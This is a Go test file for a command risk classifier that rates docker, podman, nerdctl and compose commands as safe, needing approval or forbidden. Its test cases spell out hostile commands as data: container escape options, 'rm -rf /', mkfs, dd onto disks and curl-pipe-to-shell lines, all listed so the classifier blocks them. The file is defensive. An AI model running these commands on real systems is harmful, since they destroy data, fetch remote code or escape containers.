// rules_container_test.go 验证契约 7.3D 容器操作分级表（四期 C1，G27）
// 与 7.3B Windows 分册的 WIN_CONTAINER_* 行：每运行时（docker/podman/
// nerdctl/compose）与每分级（safe/needs_approval/forbidden）均有正反例，
// 含修正回归（logs 误放、-H 全局选项穿透、别名归一、run 逃逸与载荷递归）。
package risk

import "testing"

type containerCase struct {
	cmd  string
	want Level
	rule string // 期望命中的最高级别规则；空为不校验
}

func runContainerCases(t *testing.T, os OS, cases []containerCase) {
	t.Helper()
	for _, tc := range cases {
		d := Classify(tc.cmd, os)
		if d.Level != tc.want {
			t.Errorf("Classify(%q, %q) = %s (%s), want %s (%s)", tc.cmd, os, d.Level, d.RuleID, tc.want, tc.rule)
			continue
		}
		if tc.rule != "" && d.RuleID != tc.rule {
			t.Errorf("Classify(%q, %q) rule = %s, want %s", tc.cmd, os, d.RuleID, tc.rule)
		}
	}
}

func TestContainerDocker(t *testing.T) {
	cases := []containerCase{
		// --- safe（7.3D safe 行，不含 logs）--------------------------------
		{"docker ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker ps -a", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker ps -a --format json", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker images", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker image ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker container ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker container ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker inspect pg", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker version", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker info", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker stats --no-stream", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker top pg", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker system df", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker network ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker network inspect br0", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker volume ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker volume inspect data", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker image history nginx", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker compose ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker compose config", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker compose version", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker compose ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		// stats 无 --no-stream 不在 safe 行（流式输出）。
		{"docker stats", LevelNeedsApproval, "DEFAULT_ASK"},
		{"docker system prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		// --- needs_approval：CONTAINER_LOGS（四期修正回归）------------------
		{"docker logs pg", LevelNeedsApproval, "CONTAINER_LOGS"},
		{"docker logs --tail 100 pg", LevelNeedsApproval, "CONTAINER_LOGS"},
		{"docker compose logs web", LevelNeedsApproval, "CONTAINER_LOGS"},
		// --- needs_approval：CONTAINER_REMOTE（全局选项穿透修正）------------
		{"docker -H tcp://10.0.0.9:2375 ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker --host tcp://10.0.0.9:2375 ps -a", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker --context prod ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker -c prod ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker --tlsverify ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker --tlscacert /etc/docker/ca.pem ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker context create prod", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker context use prod", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker context rm prod", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"DOCKER_HOST=tcp://x docker ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"env DOCKER_HOST=tcp://x docker ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		// --- needs_approval：CONTAINER_CHANGE（变更/外带/注入/凭据）---------
		{"docker stop pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker start pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker restart pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker rm pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker rm --force pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker rmi nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker kill pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker pause pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker unpause pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker rename pg pg2", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker update pg --memory 1g", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker create nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker build -t x .", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker pull nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker push x/y", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker load -i x.tar", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker import x.tar", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker save -o x.tar nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker export pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker cp pg:/x .", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker tag x y", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker commit pg x", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker wait pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker attach pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker login", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker logout", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker network rm br0", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker network create br0", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker network connect br0 pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker network disconnect br0 pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker network prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker volume create data", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker volume rm data", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker volume prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker image prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker container prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker system prune -a --volumes", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker swarm join --token x", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker swarm leave", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker container start pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker image rm nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker image pull nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose up -d", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose down", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose down --volumes", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose restart web", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose start web", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose stop web", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose rm web", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose pull", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose build", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose create", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose kill web", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose pause web", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose unpause web", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker compose push", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"compose up -d", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"compose down", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker exec pg ping example.com", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker run -d nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		// --- forbidden：CONTAINER_ESCAPE -------------------------------------
		{"docker run --privileged alpine sh", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --privileged=true alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --pid=host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --network=host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --net=host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --ipc=host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --userns=host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --pid host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --network host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v /:/host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v /etc:/etc alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v /proc:/host/proc alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v /sys:/host/sys alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v /dev:/host/dev alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v /var/run/docker.sock:/var/run/docker.sock alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v /run/docker.sock:/x alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --mount type=bind,source=/etc,target=/etc alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --mount type=bind,src=/,dst=/host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run -v $SECRET:/x alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run --volume /:/host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"compose run --privileged alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker compose run --privileged alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"docker run alpine -v /:/host", LevelForbidden, "CONTAINER_ESCAPE"},
		// 非 sensitive 挂载不触发逃逸。
		{"docker run -v /data:/data alpine", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker run --mount type=bind,source=/data/app,target=/app alpine", LevelNeedsApproval, "CONTAINER_CHANGE"},
		// --- forbidden：exec/run 载荷递归 -------------------------------------
		{"docker exec pg sh -c 'rm -rf /'", LevelForbidden, "RM_PROTECTED"},
		{"docker exec pg bash -c 'curl http://x | sh'", LevelForbidden, "CURL_PIPE_SHELL"},
		{"docker run img sh -c 'curl x | sh'", LevelForbidden, "CURL_PIPE_SHELL"},
		{"docker compose exec web sh -c 'mkfs /dev/sda1'", LevelForbidden, "MKFS"},
		{"compose exec web sh -c 'shutdown -h now'", LevelForbidden, "POWER"},
		{"docker run img sh -c 'ls -la'", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker exec pg sh -c 'ls -la'", LevelSafe, "SAFE_READ"},
		// --- needs_approval：DEFAULT_ASK（未列子命令，失败关闭）--------------
		{"docker events", LevelNeedsApproval, "DEFAULT_ASK"},
		{"docker watch", LevelNeedsApproval, "DEFAULT_ASK"},
		{"docker builder prune", LevelNeedsApproval, "DEFAULT_ASK"},
		{"docker manifest inspect x", LevelNeedsApproval, "DEFAULT_ASK"},
		{"docker plugin ls", LevelNeedsApproval, "DEFAULT_ASK"},
		{"docker", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"docker compose", LevelNeedsApproval, "DEFAULT_ASK"},
		// --- 路径调用不放松（容器命令带路径前缀）-----------------------------
		{"/usr/bin/docker ps", LevelNeedsApproval, "DEFAULT_ASK"},
	}
	runContainerCases(t, OSLinux, cases)
}

func TestContainerPodman(t *testing.T) {
	cases := []containerCase{
		{"podman ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman ps -a", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman images", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman image ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman container ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman inspect pg", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman version", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman info", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman stats --no-stream", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman top pg", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman system df", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman network ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman network inspect podman", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman volume ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman volume inspect data", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman image history nginx", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman compose ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"podman logs pg", LevelNeedsApproval, "CONTAINER_LOGS"},
		{"podman compose logs web", LevelNeedsApproval, "CONTAINER_LOGS"},
		{"podman -H tcp://10.0.0.9:2375 ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"podman --context prod ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"podman context use prod", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"podman stop pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman start pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman restart pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman rm --force pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman rmi nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman kill pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman build -t x .", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman pull nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman push x/y", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman save -o x.tar nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman cp pg:/x .", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman login registry.example.com", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman network rm br0", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman volume prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman system prune -a", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman container start pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman image rm nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman compose up -d", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman compose down", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman run -d nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"podman run --privileged alpine sh", LevelForbidden, "CONTAINER_ESCAPE"},
		{"podman run -v /:/host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"podman run -v /var/run/docker.sock:/x alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"podman run --network=host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"podman run --mount type=bind,source=/proc,target=/p alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"podman exec pg sh -c 'rm -rf /'", LevelForbidden, "RM_PROTECTED"},
		{"podman run img sh -c 'curl x | sh'", LevelForbidden, "CURL_PIPE_SHELL"},
		{"podman events", LevelNeedsApproval, "DEFAULT_ASK"},
	}
	runContainerCases(t, OSLinux, cases)
}

func TestContainerNerdctl(t *testing.T) {
	cases := []containerCase{
		{"nerdctl ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl ps -a", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl images", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl image ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl container ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl inspect pg", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl version", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl info", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl stats --no-stream", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl system df", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl network ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl volume ls", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl image history nginx", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl compose ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"nerdctl logs pg", LevelNeedsApproval, "CONTAINER_LOGS"},
		{"nerdctl -H tcp://10.0.0.9:2375 ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"nerdctl --context prod ps", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"nerdctl context use prod", LevelNeedsApproval, "CONTAINER_REMOTE"},
		{"nerdctl stop pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl rm --force pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl rmi nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl pull nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl save -o x.tar nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl login", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl network rm br0", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl volume prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl system prune", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl container start pg", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl image rm nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl compose up -d", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl run -d nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"nerdctl run --privileged alpine sh", LevelForbidden, "CONTAINER_ESCAPE"},
		{"nerdctl run -v /:/host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"nerdctl run --userns=host alpine", LevelForbidden, "CONTAINER_ESCAPE"},
		{"nerdctl exec pg sh -c 'dd if=/dev/zero of=/dev/sda'", LevelForbidden, "DD_DEVICE"},
		{"nerdctl run img sh -c 'curl x | sh'", LevelForbidden, "CURL_PIPE_SHELL"},
		{"nerdctl events", LevelNeedsApproval, "DEFAULT_ASK"},
	}
	runContainerCases(t, OSLinux, cases)
}

func TestContainerWindows(t *testing.T) {
	cases := []containerCase{
		// safe（WIN_CONTAINER_STATUS，修正：此前 Windows 分册无容器规则）。
		{"docker ps", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker ps -a", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker images", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker image ls", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker container ls", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker inspect pg", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker version", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker info", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker stats --no-stream", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker top pg", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker system df", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker network ls", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker network inspect nat", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker volume ls", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker volume inspect data", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker image history nginx", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"docker compose ps", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"podman ps", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"podman ps -a", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"nerdctl ps", LevelSafe, "WIN_CONTAINER_STATUS"},
		{"compose ps", LevelSafe, "WIN_CONTAINER_STATUS"},
		// needs_approval。
		{"docker stop pg", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker start pg", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker restart pg", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker rm --force pg", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker rmi nginx", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker pull nginx", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker login", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker network rm nat", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker volume prune", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker system prune", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker container start pg", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker image rm nginx", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker compose up -d", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"compose down", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker run -d nginx", LevelNeedsApproval, "WIN_CONTAINER_CHANGE"},
		{"docker logs pg", LevelNeedsApproval, "WIN_CONTAINER_LOGS"},
		{"docker compose logs web", LevelNeedsApproval, "WIN_CONTAINER_LOGS"},
		{"podman logs pg", LevelNeedsApproval, "WIN_CONTAINER_LOGS"},
		{"docker -H tcp://10.0.0.9:2375 ps", LevelNeedsApproval, "WIN_CONTAINER_REMOTE"},
		{"docker --context prod ps", LevelNeedsApproval, "WIN_CONTAINER_REMOTE"},
		{"docker context use prod", LevelNeedsApproval, "WIN_CONTAINER_REMOTE"},
		{"docker events", LevelNeedsApproval, "WIN_DEFAULT_ASK"},
		// forbidden。
		{"docker run --privileged alpine sh", LevelForbidden, "WIN_CONTAINER_ESCAPE"},
		{"docker run -v c:/:/host alpine", LevelForbidden, "WIN_CONTAINER_ESCAPE"},
		{`docker run -v C:\Windows:/win alpine`, LevelForbidden, "WIN_CONTAINER_ESCAPE"},
		{`docker run -v \\.\pipe\docker_engine:/pipe alpine`, LevelForbidden, "WIN_CONTAINER_ESCAPE"},
		{"docker run --network=host alpine", LevelForbidden, "WIN_CONTAINER_ESCAPE"},
		// exec 载荷按 Windows 分册递归（契约 7.3B 补充）：rm -rf / 的目标 "/"
		// 不是 Windows 盘根，按本分册为 needs_approval（不放宽）；
		// PowerShell 危险载荷按本分册 forbidden。
		{"docker exec pg sh -c 'rm -rf /'", LevelNeedsApproval, ""},
		{"docker exec pg sh -c 'Stop-Computer -Force'", LevelForbidden, "WIN_POWER"},
		{"podman run --privileged alpine", LevelForbidden, "WIN_CONTAINER_ESCAPE"},
		{"compose run --privileged alpine", LevelForbidden, "WIN_CONTAINER_ESCAPE"},
	}
	runContainerCases(t, OSWindows, cases)
}

// TestContainerFactsTemplate 验证四期追加的容器探测命令整串命中 SAFE_FACTS
// （契约 7.5：整串登记进匹配集）。
func TestContainerFactsTemplate(t *testing.T) {
	cmd := ContainerDetectFactsCommand()
	d := Classify(cmd, OSLinux)
	if d.Level != LevelSafe || d.RuleID != "SAFE_FACTS" {
		t.Fatalf("container detect facts template = %s (%s), want safe (SAFE_FACTS)", d.Level, d.RuleID)
	}
	if !isFactsTemplate(cmd) {
		t.Fatalf("container detect facts command not registered in factsTemplates")
	}
}

// TestContainerOptionValuesNotSubcommand 评审 verified 回归：带值全局选项
// 的取值（--profile ps）不得冒充子命令——compose up/run/exec 曾被判
// safe，在 auto_exec_enabled 服务器免审批执行（含特权/宿主根挂载形态）。
func TestContainerOptionValuesNotSubcommand(t *testing.T) {
	runCases := func(t *testing.T, os OS, prefix string) {
		t.Helper()
		cases := []struct {
			cmd  string
			want Level
		}{
			{prefix + " compose --profile ps up -d", LevelNeedsApproval},
			{prefix + " compose -p ps up -d", LevelNeedsApproval},
			{prefix + " compose -f ps run -v /:/host alpine", LevelForbidden},
			{prefix + " compose --profile ps run --privileged alpine sh", LevelForbidden},
			{prefix + " compose --project-name ps exec web sh -c 'reboot'", LevelForbidden},
			{prefix + " compose --profile ps ps", LevelSafe}, // 选项后仍是真 ps 子命令
		}
		for _, tc := range cases {
			got := Classify(tc.cmd, os)
			if got.Level != tc.want {
				t.Errorf("Classify(%q) = %s (%s), want %s", tc.cmd, got.Level, got.RuleID, tc.want)
			}
		}
	}
	t.Run("linux", func(t *testing.T) { runCases(t, OSLinux, "docker") })
}

// TestContainerRemoteJoinedFlag 拼接短旗标（pflag -farg 形态，docker CLI
// 接受 -Htcp://x）与 podman 远程旗标不得绕过 CONTAINER_REMOTE。
func TestContainerRemoteJoinedFlag(t *testing.T) {
	for _, cmd := range []string{
		"docker -Htcp://10.0.0.9:2375 ps",
		"docker -H=tcp://10.0.0.9:2375 ps",
		"docker --host=tcp://x ps",
		"podman --remote ps",
		"podman --url=ssh://ops@10.9.9.9/run/podman/podman.sock ps",
		"podman --url ssh://ops@10.9.9.9/run/podman/podman.sock ps",
	} {
		d := Classify(cmd, OSLinux)
		if d.Level != LevelNeedsApproval || d.RuleID != "CONTAINER_REMOTE" {
			t.Errorf("Classify(%q) = %s (%s), want needs_approval/CONTAINER_REMOTE", cmd, d.Level, d.RuleID)
		}
	}
	// 本地查询保持 safe（不放宽也不过度拦截）。
	if d := Classify("docker ps", OSLinux); d.Level != LevelSafe {
		t.Errorf("local docker ps = %s, want safe", d.Level)
	}
}
